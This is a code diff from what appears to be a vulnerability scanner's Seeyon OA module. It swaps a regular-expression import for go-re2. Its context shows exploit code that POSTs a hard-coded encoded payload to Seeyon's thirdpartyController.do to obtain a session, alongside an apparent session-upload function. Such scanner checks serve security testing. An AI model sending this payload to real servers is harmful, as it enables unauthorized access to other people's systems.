@@ -2,10 +2,10 @@ package seeyon
 
 import (
     "bytes"
+    regexp "github.com/wasilibs/go-re2"
     "github.com/yhy0/Jie/pkg/protocols/httpx"
     "mime/multipart"
     "net/textproto"
-    "regexp"
     "strings"
     "time"
 )
@@ -25,7 +25,7 @@ func SessionUpload(u string, client *httpx.Client) bool {
 
 func getsession(u string, client *httpx.Client) string {
     data := "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
-
+    
     header := make(map[string]string, 1)
     header["Content-Type"] = "application/x-www-form-urlencoded"
     if req, err := client.Request(u+"/seeyon/thirdpartyController.do", "POST", data, header); err == nil {
